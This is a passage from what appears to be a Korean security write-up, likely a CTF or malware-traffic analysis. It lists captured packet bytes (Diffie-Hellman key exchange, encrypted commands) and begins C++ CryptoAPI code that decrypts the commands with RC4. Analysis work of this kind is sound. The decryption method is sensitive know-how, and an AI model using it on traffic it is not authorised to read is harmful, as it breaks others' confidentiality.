<span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">peer0_1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 76 */</span>                  <span class="c1">// 2. send public key</span>
<span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x37</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">peer1_0</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 78 */</span>                  <span class="c1">// 3. recv size</span>
<span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">buffer</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 79 */</span>                  <span class="c1">// 4. recv key</span>
<span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb8</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">cmd1_length</span> <span class="o">=</span> <span class="mh">0x67</span><span class="p">;</span> <span class="cm">/* Packet 87 */</span>                  <span class="c1">// 5. cmd 1 length</span>
<span class="n">BYTE</span> <span class="n">cmd1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 88 */</span>                  <span class="c1">// 6. cmd 1</span>
<span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span><span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span><span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span><span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x4f</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">cmd2_length</span> <span class="o">=</span> <span class="mh">0x66</span><span class="p">;</span><span class="c1">// [] = { /* Packet 315 */                 // 7. cmd 2 length</span>
<span class="n">BYTE</span> <span class="n">cmd2</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 316 */</span>                 <span class="c1">// 8. cmd 2</span>
<span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span><span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span><span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span><span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span><span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x18</span> <span class="p">};</span>

</pre></table></code></div></div><p>지금까지 모은 데이터를 이용해 다음과 같이 소스를 작성해서 명령어를 복호화할 수 있다.</p><ol><li>주어진 G, P 값 설정하고 임의 키(X) 생성<li>서버에서 Export 한 키값을 Import<li>암호화방식 RC4 로 바꾼 뒤 구한 키값으로 overwrite<li>복호화</ol><div class="language-cpp highlighter-rouge"><div class="code-header"> <span label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
</pre><td class="rouge-code"><pre>
<span class="cp">#pragma comment(lib, "crypt32.lib")
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include &lt;windows.h&gt;
#include &lt;Wincrypt.h&gt;
</span>
<span class="n">BYTE</span> <span class="n">peer0_0</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 74 */</span>                  <span class="c1">// 1. send size</span>
<span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">peer0_1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 76 */</span>                  <span class="c1">// 2. send public key</span>
<span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span><span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x37</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">peer1_0</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 78 */</span>                  <span class="c1">// 3. recv size</span>
<span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">buffer</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 79 */</span>                  <span class="c1">// 4. recv key</span>
<span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span><span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span><span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb8</span> <span class="p">};</span>
<span class="n">BYTE</span> <span class="n">cmd1_length</span> <span class="o">=</span> <span class="mh">0x67</span><span class="p">;</span> <span class="cm">/* Packet 87 */</span>                  <span class="c1">// 5. cmd 1 length</span>
<span class="n">BYTE</span> <span class="n">cmd1</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 88 */</span>                  <span class="c1">// 6. cmd 1</span>
<span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span><span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span 